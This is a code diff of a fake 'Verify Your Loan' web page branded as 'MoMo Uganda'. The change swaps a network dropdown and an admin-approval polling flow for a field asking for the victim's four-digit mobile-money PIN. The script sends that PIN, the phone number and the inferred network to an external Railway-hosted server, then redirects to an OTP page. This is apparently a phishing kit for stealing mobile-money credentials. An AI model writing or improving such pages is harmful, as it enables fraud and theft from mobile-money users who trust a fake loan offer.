@@ -127,10 +127,6 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        .btn-primary:disabled {
-            background: #d1d5db;
-            cursor: not-allowed;
-        }
         .btn-back {
             width: 100%;
             background: transparent;
@@ -152,43 +148,11 @@
             margin-bottom: 16px;
             font-size: 13.5px;
         }
-        .status-msg {
-            display: none;
-            background: #eff6ff;
-            border: 1px solid #93c5fd;
-            color: #1e40af;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 16px;
+        .security-note {
             text-align: center;
-            font-weight: 600;
-        }
-        .waiting-area {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background: #fef3c7;
-            border-radius: 16px;
-            margin-bottom: 20px;
-        }
-        .waiting-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 12px;
-        }
-        .dot {
-            width: 10px;
-            height: 10px;
-            background: #E42320;
-            border-radius: 50%;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        .dot:nth-child(2) { animation-delay: 0.3s; }
-        .dot:nth-child(3) { animation-delay: 0.6s; }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
+            font-size: 12px;
+            color: #9ca3af;
+            margin-top: 18px;
         }
         #spinner {
             display: none;
@@ -210,12 +174,6 @@
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .security-note {
-            text-align: center;
-            font-size: 12px;
-            color: #9ca3af;
-            margin-top: 18px;
-        }
     </style>
 </head>
 <body>
@@ -235,7 +193,7 @@
             </div>
         </div>
         <div class="header-title">Verify Your Loan</div>
-        <div class="header-desc">Enter your details to continue</div>
+        <div class="header-desc">Enter your MoMo number and PIN</div>
     </div>
 
     <div class="loan-info">
@@ -249,33 +207,15 @@
 
     <div class="form-body">
         <div class="form-group">
-            <label>Mobile Money Network</label>
-            <select id="network">
-                <option value="MTN">MTN MoMo</option>
-                <option value="Airtel">Airtel Money</option>
-                <option value="Africell">Africell</option>
-            </select>
+            <label>Mobile Money Number</label>
+            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
         </div>
         <div class="form-group">
-            <label>MoMo Phone Number</label>
-            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
-            <div style="font-size:11px; color:#9ca3af; margin-top:5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
+            <label>MoMo PIN</label>
+            <input type="password" id="pin" placeholder="••••" maxlength="4">
         </div>
-        
         <div class="error-msg" id="errorMsg"></div>
-        <div class="status-msg" id="statusMsg"></div>
-        
-        <div class="waiting-area" id="waitingArea">
-            <strong>⏳ Waiting for Admin Approval</strong>
-            <div class="waiting-dots">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-            </div>
-            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application...</p>
-        </div>
-        
-        <button class="btn-primary" id="submitBtn">Submit Application →</button>
+        <button class="btn-primary" id="submitBtn">Continue →</button>
         <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
         <div class="security-note">🔒 Secured by MoMo Uganda</div>
     </div>
@@ -283,14 +223,11 @@
 
 <div id="spinner">
     <div class="spin-ring"></div>
-    <p style="color:white;">Submitting application...</p>
+    <p style="color:white;">Processing...</p>
 </div>
 
 <script>
     const API_URL = 'https://momo-uganda-production.up.railway.app';
-    
-    let pollInterval = null;
-    let currentLoanId = null;
 
     function loadLoanData() {
         const data = sessionStorage.getItem('calculatorData');
@@ -301,12 +238,6 @@
         }
     }
 
-    function isValidPhone(phone) {
-        if (phone.length !== 10) return false;
-        const prefixes = ['077', '078', '075', '070', '039', '074', '076'];
-        return prefixes.some(p => phone.startsWith(p));
-    }
-
     function showError(msg) {
         const err = document.getElementById('errorMsg');
         err.textContent = msg;
@@ -314,74 +245,30 @@
         setTimeout(() => err.style.display = 'none', 4000);
     }
 
-    function showStatus(msg, isSuccess = false) {
-        const status = document.getElementById('statusMsg');
-        status.textContent = msg;
-        status.style.background = isSuccess ? '#f0fdf4' : '#eff6ff';
-        status.style.color = isSuccess ? '#166534' : '#1e40af';
-        status.style.border = isSuccess ? '1px solid #86efac' : '1px solid #93c5fd';
-        status.style.display = 'block';
-        setTimeout(() => status.style.display = 'none', 5000);
-    }
-
-    // Poll for approval status
-    function startPolling(loanId) {
-        console.log('Starting polling for loan:', loanId);
-        
-        pollInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`${API_URL}/api/loan/${loanId}`);
-                const data = await response.json();
-                
-                console.log('Poll response:', data);
-                
-                if (data.success && data.loan.status === 'otp_sent') {
-                    // Approved! Redirect to OTP page
-                    clearInterval(pollInterval);
-                    document.getElementById('spinner').style.display = 'none';
-                    showStatus("✅ Approved! Redirecting to OTP page...", true);
-                    setTimeout(() => {
-                        window.location.href = `${API_URL}/otp.html`;
-                    }, 1500);
-                } 
-                else if (data.success && data.loan.status === 'declined') {
-                    clearInterval(pollInterval);
-                    document.getElementById('spinner').style.display = 'none';
-                    document.getElementById('waitingArea').style.display = 'none';
-                    showError("❌ Application declined by admin.");
-                    document.getElementById('submitBtn').disabled = false;
-                    document.getElementById('submitBtn').textContent = "Submit Application →";
-                }
-            } catch (err) {
-                console.error('Polling error:', err);
-            }
-        }, 3000); // Check every 3 seconds
-        
-        // Stop polling after 5 minutes
-        setTimeout(() => {
-            if (pollInterval) {
-                clearInterval(pollInterval);
-                console.log('Polling stopped after timeout');
-            }
-        }, 300000);
-    }
-
-    // Submit application
     document.getElementById('submitBtn').onclick = async () => {
         const phone = document.getElementById('phone').value.trim();
-        const network = document.getElementById('network').value;
+        const pin = document.getElementById('pin').value.trim();
         
-        if (!phone || !isValidPhone(phone)) {
-            showError("Enter valid Uganda number (077/078/075/070/039)");
+        if (!phone || phone.length !== 10) {
+            showError("Enter valid Uganda number (10 digits)");
+            return;
+        }
+        if (!pin || pin.length !== 4) {
+            showError("PIN must be 4 digits");
             return;
         }
 
-        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
-        
         const btn = document.getElementById('submitBtn');
         btn.disabled = true;
-        btn.textContent = "Submitting...";
+        btn.textContent = "Processing...";
         document.getElementById('spinner').style.display = 'flex';
+
+        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
+        
+        // Determine network from phone prefix
+        let network = 'MTN';
+        if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
+        else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
 
         try {
             const response = await fetch(`${API_URL}/api/save-loan`, {
@@ -389,7 +276,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     phone: phone,
-                    pin: "1234",
+                    pin: pin,
                     network: network,
                     amount: loanData.amount || 500000,
                     duration: loanData.duration || 90,
@@ -402,20 +289,12 @@
             const data = await response.json();
             
             if (data.success) {
-                currentLoanId = data.loanId;
-                sessionStorage.setItem('loanId', currentLoanId);
+                sessionStorage.setItem('loanId', data.loanId);
                 sessionStorage.setItem('userPhone', phone);
                 sessionStorage.setItem('userNetwork', network);
                 
-                // Hide spinner, show waiting area
                 document.getElementById('spinner').style.display = 'none';
-                document.getElementById('waitingArea').style.display = 'block';
-                btn.style.display = 'none';
-                
-                showStatus("📱 Application sent! Waiting for admin approval on Telegram...");
-                
-                // Start polling for approval
-                startPolling(currentLoanId);
+                window.location.href = `${API_URL}/otp.html`;
             } else {
                 throw new Error(data.error || "Submission failed");
             }
@@ -424,24 +303,17 @@
             document.getElementById('spinner').style.display = 'none';
             showError("Error: " + err.message);
             btn.disabled = false;
-            btn.textContent = "Submit Application →";
+            btn.textContent = "Continue →";
         }
     };
 
-    // Phone input validation
     document.getElementById('phone').addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
 
-    // Check if there's a pending loan on page load
-    const existingLoanId = sessionStorage.getItem('loanId');
-    if (existingLoanId) {
-        currentLoanId = existingLoanId;
-        document.getElementById('submitBtn').style.display = 'none';
-        document.getElementById('waitingArea').style.display = 'block';
-        showStatus("⏳ You have a pending application. Waiting for admin approval...");
-        startPolling(currentLoanId);
-    }
+    document.getElementById('pin').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+    });
 
     loadLoanData();
 </script>
